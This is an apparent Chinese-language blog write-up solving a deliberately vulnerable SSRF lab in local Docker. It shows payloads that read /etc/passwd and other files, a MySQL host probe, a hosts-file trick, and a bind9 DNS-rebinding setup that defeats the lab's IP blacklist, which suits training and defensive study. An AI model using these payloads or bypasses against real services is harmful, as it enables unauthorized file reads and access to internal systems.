---
title:  "SSRF Vulnerable Lab"
excerpt: "SSRF Vulnerable Lab"
author: "lcc"
layout: single
tags:
  - 早期文档
categories:
  - web安全
---
# SSRF Vulnerable Lab

## 环境搭建

在kali 2022上使用docker搭建

```bash
docker pull youyouorz/ssrf-vulnerable-lab 

docker run --name ssrf-lab -p 80:80 -d youyouorz/ssrf-vulnerable-lab 
```

使用docker再启用一个mysql

```bash
docker pull mysql:5

docker run --name mysql -p 3306:3306 -d -e MYSQL_ROOT_PASSWORD=123456 mysql:5 
```



mysql的ip为`172.17.0.3`，ssrf-lab的ip为`172.17.0.2`，docker宿主机ip为`192.168.194.152`

## 实战

### 1. 文件读取

抓包，然后发现使用post提交请求，请求body为：

```
file=local.txt&read=load+file
```

`local.txt`是与`file_get_content.php`同目录下的一个文本文件

```php
if(isset($_POST['read']))
{

$file=trim($_POST['file']);

echo htmlentities(file_get_contents($file));

} 
```

后台获取read参数值，然后获取file参数值，最后使用file_get_contents函数读取文件并转成html实体。

因此，此处只要给一个存在的文件路径就可以成功读取文件

```
../../../etc/passwd
```

或者：

```
file:///etc/passwd
```

再或者：

```
/etc/passwd
```

使用http也可：

```
http://127.0.0.1/file_get_content.php
```



### 2. 连接到远程主机

抓包，获得post请求体：

```
host=127.0.0.1&uname=root&pass=admin123&sbmt=Chal+Billu%2C+Ghuma+de+soda+%3E%3AD%3C
```

查看源码：

```php
$host=trim($_POST['host']);
$uname=trim($_POST['uname']);
$pass=trim($_POST['pass']);



$r=mysqli_connect($host,$uname,$pass);

if (mysqli_connect_errno())
  {
  echo  mysqli_connect_error();
  }

```

其实就是简单的对一个host发起mysql连接，连接失败就会输出错误信息

### 3. 文件下载

抓个包，post请求body为：

```
file=%2Fetc%2Fpasswd&download=Donwload+file
```

与文件读取类似，不过使用的是readfile函数，源码为：

```php
function file_download($download)
{
	if(file_exists($download))
				{
					xxxxx
					readfile ($download);
				}
				else
				{
				echo "<script>alert('file not found');</script>";	
				}
	
}
```

readfile():会将文件内容读入缓冲区并返回

ob_clean():清空输出缓冲区的内容

然后给出：

```
/etc/passwd
```

就可以下载成功

### 4. 基于dns欺骗绕过ip黑名单

 DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。

1. hosts文件篡改：使得其dns解析是返回攻击者指定的ip
2. dns劫持（域名劫持）：通过劫持了dns服务器，修改某域名的解析记录，导致对该域名的访问被引导到恶意网站。
3. dns污染：指的是用户访问一个地址，国内的服务器 (非DNS)监控到用户访问的已经被标记地址时，服务器伪装成DNS服务器向用户发回错误的地址的行为，常见的就是连接被重置

因此此处应该是要通过劫持hosts文件以绕过ip黑名单。

1. 修改hosts文件（`/etc/hosts`），末尾添加一行：

   ```
   127.0.0.1 hhhh.com 
   ```

2. 输入：

   ```
   http://127.0.0.1/file_get_content.php
   ```

   发现ip被禁用

   然后再输入：

   ```
   http://hhhh.com/file_get_content.php
   ```

查看一下源码的关键部分：

```php
if(strstr($file, 'localhost') == false && preg_match('/(^https*:\/\/[^:\/]+)/', $file)==true)
{
	$host=parse_url($file,PHP_URL_HOST);
	if(filter_var($host, FILTER_VALIDATE_IP)) 
		{
			if(filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE |  FILTER_FLAG_NO_RES_RANGE)== false) 
				{	
					echo '
						   <table width="50%" cellspacing="0" cellpadding="0" class="tb1" style="opacity: 0.6;">
						   <tr><td align=center style="padding: 10px;" >
							The provided IP is from Private range and hence not allowed

						   </td></tr></table>
						   <table width="50%" cellspacing="0" cellpadding="0" class="tb1" style="margin:10px 2px 10px;opacity: 0.6;" >';
				}
			else 
				{
					echo '<textarea rows=20 cols=60>'.file_get_contents($file)."</textarea>";
				}
		}
	else 
		{
			echo '<textarea rows=20 cols=60>'.file_get_contents($file)."</textarea>";
		}
  
  }
  
  elseif(strstr(strtolower($file), 'localhost') == true && preg_match('/(^https*:\/\/[^:\/]+)/', $file)==true) 
	{
		echo '
		<table width="30%" cellspacing="0" cellpadding="0" class="tb1" style="opacity: 0.6;">
						   <tr><td align=center style="padding: 10px;" >
							Tyring to access Localhost o_0 ? 

						   </td></tr></table>
						   <table width="50%" cellspacing="0" cellpadding="0" class="tb1" style="margin:10px 2px 10px;opacity: 0.6;" >';
	}
  
  else 
	{
		echo '<textarea rows=20 cols=60>'.file_get_contents($file)."</textarea>";
	}
} 
```

当使用http或https访问时，如果包含localhost，或ip不是合法的ipv4、ip在私有范围内、ip在保留的黑名单内就会访问出错

### 5.基于dns重绑（dns rebind）绕过ip黑名单

dns重绑其实就是，当将一个域名解析为一个ip后隔一段时间会重新对该域名进行dns解析，这个时间段可能固定为60秒。

当进行下一次dns解析时返回了一个错误的ip，比如说内网的ip就可能会导致未授权的访问。

因此dns rebind也可以绕过黑名单。

先抓个包，post请求body为：

```
file=http%3A%2F%2F192.168.194.152%3A8000%2Furls.txt&read=load+file
```

查看源码做了哪些改动：

```php
if(strstr($file, 'localhost') == false && preg_match('/(^https*:\/\/[^:\/]+)/', $file)==true)
  {
	get_contents($file);
  }
```

当http请求中的url包含不localhost，会使用get_contents函数对这个url进行处理：

```php
function get_contents($url) {
	$disallowed_cidrs = [ "127.0.0.1/24", "169.254.0.0/16", "0.0.0.0/8" ];
	$url_parts = parse_url($url);

		if (!array_key_exists("host", $url_parts)) { die("<p><h3 style=color:red>There was no host in your url!</h3></p>"); }
	echo '<table width="40%" cellspacing="0" cellpadding="0" class="tb1" style="opacity: 0.6;"> 
			  <tr><td align=center style="padding: 10px;" >Domain: - '.$host = $url_parts["host"].'';

		if (filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
			$ip = $host;
		} else {
			$ip = dns_get_record($host, DNS_A);
			if (count($ip) > 0) {
				$ip = $ip[0]["ip"];
				echo "<br>Resolved to IP: - {$ip}<br>";
				
			} else {
				die("<br>Your host couldn't be resolved man...</h3></p>");
			}
		}

		foreach ($disallowed_cidrs as $cidr) {
			if (in_cidr($cidr, $ip)) {
				die("<br>That IP is a blacklisted cidr ({$cidr})!</h3></p>"); // Stop processing if domain reolved to private/reserved IP
			}
		}
				
		
		echo "<br>Domain IP is not private, Here goes the data fetched from remote URL<br> </td></tr></table>";
		echo "<br><textarea rows=10 cols=50>".file_get_contents($url)."</textarea>";
	
}

function in_cidr($cidr, $ip) {
	list($prefix, $mask) = explode("/", $cidr);

	return 0 === (((ip2long($ip) ^ ip2long($prefix)) >> $mask) << $mask);
}
```

先检查url中是否存在主机名（域名或是ip），如果是合法的ip先将主机名赋给`$ip`，否则就进行dns解析获取域名的A记录（`dns_get_record`），其实也就是域名的ip。

接着对`$ip`进行检查，如果属于私有网段，那么就不会通过，由此可以看出，使用hosts劫持是无法解决这个问题的

因此考虑dns rebind，让第一次返回真正的ip，第二次返回内网ip。

1. 安装bind9

   ```bash
   apt install bind9
   ```

2. 配置正向查找区域：

   ```
   vim /etc/bind/named.conf.local
   ```

3. 输入以下内容：

   ```
   zone "example.com" {
           type master;
           file "/var/cache/bind/db.example.com";
   };
   ```

4. 配置正向查找数据文件

   ```
   gedit /var/cache/bind/db.example.com
   ```

5. 输入以下内容：

   ```
   $TTL	604800
   @	IN	SOA	example.com. root.example.com. (
   			      2		; Serial
   			 604800		; Refresh
   			  86400		; Retry
   			2419200		; Expire
   			 604800 )	; Negative Cache TTL
   ;
   @	IN	NS	localhost.
   hhh	60	IN	A	119.84.72.209
   hhh	IN	A	127.0.0.1
   ```

   两条hhh.example.com的记录对应不同的ip， 一个是119.84.72.209（公网地址，随意一个公网地址都可以），另一个是127.0.0.1（内网地址）

6. 启动bind9

   ```bash
   systemctl start named
   ```

7. 在Load Remote File处输入以下内容：

   ```
   http://hhh.example.com/local.txt
   ```

   多次输入，最后会发现虽然解析的ip是`119.84.72.209`，但实际使用的ip为127.0.0.1，最终绕过黑名单

   





